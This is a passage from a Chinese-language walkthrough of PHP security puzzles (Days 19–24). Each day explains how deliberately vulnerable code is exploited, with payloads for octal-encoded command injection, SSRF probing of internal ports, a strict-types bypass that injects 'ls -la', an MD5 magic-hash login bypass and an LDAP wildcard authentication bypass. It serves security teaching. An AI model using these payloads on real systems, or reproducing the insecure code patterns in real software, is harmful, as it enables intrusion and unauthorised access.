        system("/usr/bin/convert {$this->file} --resize $e
                ./thumbs/{$this->file}");
    }

    function __toString() {
        return "<a href={$this->file}>
                <img src=./thumbs/{$this->file}></a>";
    }
}

echo (new ImageViewer("image.png"));
```
本题的关键是在于`stripcslashes`函数。查看php手册中的说明:
>返回反转义后的字符串。可识别类似 C 语言的 \n，\r，... 八进制以及十六进制的描述。

在PHP中还有一个类似的函数`stripslashes`。查看php手册中的说明：
>反引用一个引用字符串。

所以这两者之间的差别是在于`stripcslashes`和`stripslashes`在于，`stripcslashes`会转义C语言以及十进制和8进制。通过下面的例子来说明：
```PHP
var_dump(stripslashes('0\073\163\154\145\145\160\0405\073'));       // 0�73163154145145160�405�73
var_dump(stripcslashes('0\073\163\154\145\145\160\0405\073'));      // 0;sleep 5;
```
因为使用`stripcslashes`之后，会将`\163`就会解析八进制的`163`,得到的就是`s`。

回到本题中，`[^0-9\\\]`因为着我们仅仅只能使用数字和`\`。在这种情况下很难输入命令造成命令执行。但是同时`stripcslashes`刚好可以解析八进制，而八进制全部都是数字，所以在这种情况下我们还是能够进行命令注入。我们将我们需要的命令转换为八进制进行输出就可以进行注入。

例如命令`0;sleep 5;`,转换成为八进制就是`0\073\163\154\145\145\160\0405\073`,那么最终能够执行的命令就是：
```
/usr/bin/convert images/image.png --resize 0;sleep 5; ./thumbs/image.png
```

[返回目录](#目录)

## Day 20 - Stocking
### 题目
```PHP
set_error_handler(function ($no, $str, $file, $line) {
    throw new ErrorException($str, 0, $no, $file, $line);
}, E_ALL);

class ImageLoader
{
    public function getResult($uri)
    {
        if (!filter_var($uri, FILTER_VALIDATE_URL)) {
            return '<p>Please enter valid uri</p>';
        }

        try {
            $image = file_get_contents($uri);
            $path = "./images/" . uniqid() . '.jpg';
            file_put_contents($path, $image);
            if (mime_content_type($path) !== 'image/jpeg') {
                unlink($path);
                return '<p>Only .jpg files allowed</p>';
            }
        } catch (Exception $e) {
            return '<p>There was an error: ' .
                $e->getMessage() . '</p>';
        }
        return '<img src="' . $path . '" width="100 "/>';
    }
}

echo (new ImageLoader())->getResult($_GET['img']);
```
### 解答
本题目的是问题是在于提供了错误显示，这样就导致可以根据错误信息推断服务器上面的信息，类似于MYSQL中的报错注入。而在本题中则是存在一个SSRF漏洞。分析代码，在代码的最前方有：`set_error_handler(function ($no, $str, $file, $line) { throw new ErrorException($str, 0, $no, $file, $line);}, E_ALL);`这个就类似于设置如下的代码：`error_reporting(E_ALL);ini_set('display_errors', TRUE);ini_set('display_startup_errors', TRUE);`，如此就会包含所有的错误信息。

错误的显示配置加上`'<p>There was an error: ' .$e->getMessage() . '</p>'`就导致会在页面上显示所有的信息，包括warning信息。

正常情况下，如果使用`file_get_contents('http://127.0.0.1:80')`显示的仅仅只是`warning信息`，在正常的PHP页面中是不会显示warning信息的。但是在开启了上述的配置之后，所有的信息都会在页面上显示。这样就导致我们可以通过SSRF来探测内网的端口和服务了。例如：
1. payload可以写为:`img=http://127.0.0.1:22`，如果出现了`There was an error: file_get_contents(http://127.0.0.1:22): failed to open stream: HTTP request failed! SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2 `，则表示存在openssh的服务。
2. payload为`img=http://127.0.0.1:25`,如果出现了`There was an error: file_get_contents(http://127.0.0.1:25): failed to open stream: HTTP request failed! 220 ubuntu ESMTP Sendmail 8.15.2/8.15.2/Debian-3; Tue, 26 Dec 2017 07:43:45 -0800; (No UCE/UBE) logging access from: localhost`则表示存在SMTP。
3. 如果通过payload访问不存在的端口,`img=http://127.0.0.1:30`，出现了`There was an error: file_get_contents(http://127.0.0.1:30): failed to open stream: Connection refused`，则表明30端口没有服务。

所以通过这种方式就能够有效地探测内网端口服务了。

[返回目录](#目录)

## Day 21 - Gift Wrap
### 题目
```PHP
<?php
declare(strict_types=1);

class ParamExtractor {
    private $validIndices = [];

    private function indices($input) {
        $validate = function (int $value, $key) {
            if ($value > 0) {
                $this->validIndices[] = $key;
            }
        };

        try {
            array_walk($input, $validate, 0);
        } catch (TypeError $error) {
            echo "Only numbers are allowed as input";
        }

        return $this->validIndices;
    }

    public function getCommand($parameters) {
        $indices = $this->indices($parameters);
        $params = [];
        foreach ($indices as $index) {
            $params[] = $parameters[$index];
        }
        return implode($params, ' ');
    }
}

$cmd = (new ParamExtractor())->getCommand($_GET['p']);
system('resizeImg image.png ' . $cmd);
```
### 解答
这是一道在运行在php7上的题目，题目本上的考察点比较少见，主要是利用了`array_walk()`的一个bug。php是一个弱类型的语言，在传入参数时并不会进行类型检查，甚至有时候还会进行隐式类型转换，很多时候由于开发人员的疏忽就会导致漏洞产生。在php7中就引入了`declare(strict_types=1);`这种声明方式，在进行函数调用的时候会进行参数类型检查。如果参数类型不匹配则函数不会被调用，这种方式就和诸如Java这类强类型的语言就是一样的了。如下：
```PHP
declare(strict_types=1);
function addnum(int $a,int $b) {
    return $a+$b;
}
$result = addnum(1,2);
var_dump($result);              // 输出3
$result = addnum('1','2');
var_dump($result);              //出现Fatal error: Uncaught TypeError，Argument 1 passed to addnum() must be of the type integer, string given,程序出错，参数的数据类型不匹配
```

按照php7的这种类型，那么最后通过`validate()`函数的就只有参数是大于0的，这样看来本题目是没有问题的。但是本题的关键是在于使用了`array_walk()`来调用`validate`函数。**通过`array_walk()`调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数。**。如下：
```PHP
declare(strict_types=1);
function addnum(int &$value) {
    $value = $value+1;
}
$input = array('3a','4b');
array_walk($input,addnum);
var_dump($input);
```
最后得到的input数组是`array(4,5)`,所以说明了在使用`array_walk()`会忽略掉类型检查。

那么在本题目中，由于`array_walk()`的这种特性，导致我们可以传入任意字符进去，从而也可以造成命令执行了。最后的payload可以是`?p[1]=1&p[2]=2;%20ls%20-la`。

[返回目录](#目录)

## Day 22 - Chimney
### 题目
```PHP
if (isset($_POST['password'])) {
    setcookie('hash', md5($_POST['password']));
    header("Refresh: 0");
    exit;
}

$password = '0e836584205638841937695747769655';
if (!isset($_COOKIE['hash'])) {
    echo '<form><input type="password" name="password" />'
       . '<input type="submit" value="Login" ></form >';
    exit;
} elseif (md5($_COOKIE['hash']) == $password) {
    echo 'Login succeeded';
} else {
    echo 'Login failed';
}
```
### 解答
这道题目在各大CTF训练题中进场会见到，算是一道比较简单的题目。在本题中考察点有两个：
1. `$_COOKIE`中的内容是客户端可控的
2. 在php中以`0e数字`这样形式的变量会被以科学计数法的方式进行解析，如`$mytext1 = "0e23456";$mytext2 = "0e789";var_dump($mytext1==$mytext2);`返回是`true`

在本题目中，进行比较运算的是`md5($_COOKIE['hash']) == $password`，其中的$password是`0e836584205638841937695747769655`。所以只需要找一个`md5()`之后是`0es数字`形式的即可，例如hash为`s878926199a`就满足要求。

所以最后的payload是`Cookie:hash=s878926199a`。

[返回目录](#目录)

## Day 23 - Cookies
### 题目
```PHP
class LDAPAuthenticator {
    public $conn;
    public $host;

    function __construct($host = "localhost") {
        $this->host = $host;
    }

    function authenticate($user, $pass) {
        $result = [];
        $this->conn = ldap_connect($this->host);    
        ldap_set_option(
            $this->conn,
            LDAP_OPT_PROTOCOL_VERSION,
            3
        );
        if (!@ldap_bind($this->conn))
            return -1;
        $user = ldap_escape($user, null, LDAP_ESCAPE_DN);
        $pass = ldap_escape($pass, null, LDAP_ESCAPE_DN);
        $result = ldap_search(
            $this->conn,
            "",
            "(&(uid=$user)(userPassword=$pass))"
        );
        $result = ldap_get_entries($this->conn, $result);
        return ($result["count"] > 0 ? 1 : 0);
    }
}

if(isset($_GET["u"]) && isset($_GET["p"])) {
    $ldap = new LDAPAuthenticator();
    if ($ldap->authenticate($_GET["u"], $_GET["p"])) {
        echo "You are now logged in!";
    } else {
        echo "Username or password unknown!";
    }
}
```
### 解答
本题主要是ldap的登录验证的代码，但是由于过滤函数使用不当而导致的任意用户登录的漏洞。

在题目中使用的过滤函数是`ldap_escape($user, null, LDAP_ESCAPE_DN)`。php手册上对第三个参数的说明如下：
>The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs

当使用`ldap_search()`时需要选择`LDAP_ESCAPE_FILTER`过滤字符串，但是本题中选择的是`LDAP_ESCAPE_DN`，这样就导致过滤无效。那么最后通过传入`u=*&p=123456`这种方式就可以绕过验证。

[返回目录](#目录)


## Day 24 - Nutcracker
### 题目
```PHP
@$GLOBALS=$GLOBALS{next}=next($GLOBALS{'GLOBALS'})
[$GLOBALS['next']['next']=next($GLOBALS)['GLOBALS']]
[$next['GLOBALS']=next($GLOBALS[GLOBALS]['GLOBALS'])
[$next['next']]][$next['GLOBALS']=next($next['GLOBALS'])]
[$GLOBALS[next]['next']($GLOBALS['next']{'GLOBALS'})]=
next(neXt(${'next'}['next']));
```
### 解答
这道题目是`Hack.lu CTF 2014: Next Global Backdoor`上的一道题目，具体的解答可以看[Hack.lu CTF 2014: Next Global Backdoor](https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/next-global-backdoor)，也有一篇中文文章的介绍[Hack.lu 2014 Writeup](http://drops.xmd5.com/static/drops/tips-3420.html)

这里就不进行详细的说明了，大家有兴趣可以自行研究。但是这种写法也仅仅只会出现在CTF中，在实际的项目中很少会出现这样的代码。

[返回目录](#目录)
